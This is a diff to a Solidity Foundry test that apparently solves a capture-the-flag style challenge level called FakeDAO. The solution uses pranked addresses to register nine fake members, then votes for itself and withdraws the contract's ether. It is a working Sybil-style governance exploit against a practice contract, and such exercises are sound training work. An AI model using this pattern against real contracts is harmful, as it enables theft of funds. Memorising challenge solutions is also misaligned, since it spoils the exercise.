@@ -14,8 +14,48 @@ contract FakeDAOTest is BaseTest {
         instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
     }
 
-    function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+  function testExploitLevel() public {
+        vm.prank(address(0x1));
+        instance.register();
+        vm.stopPrank();
+
+        vm.prank(address(0x2));
+        instance.register();
+        vm.stopPrank();
+
+        vm.prank(address(0x3));
+        instance.register();
+        vm.stopPrank();
+
+        vm.prank(address(0x4));
+        instance.register();
+        vm.stopPrank();
+
+        vm.prank(address(0x5));
+        instance.register();
+        vm.stopPrank();
+
+        vm.prank(address(0x6));
+        instance.register();
+        vm.stopPrank();
+
+        vm.prank(address(0x7));
+        instance.register();
+        vm.stopPrank();
+
+        vm.prank(address(0x8));
+        instance.register();
+        vm.stopPrank();
+
+        vm.prank(address(0x9));
+        instance.register();
+        vm.stopPrank();
+
+        instance.register();
+        instance.contribute{value: 0.01 ether}();
+
+        instance.voteForYourself();
+        instance.withdraw();
 
         checkSuccess();
     }
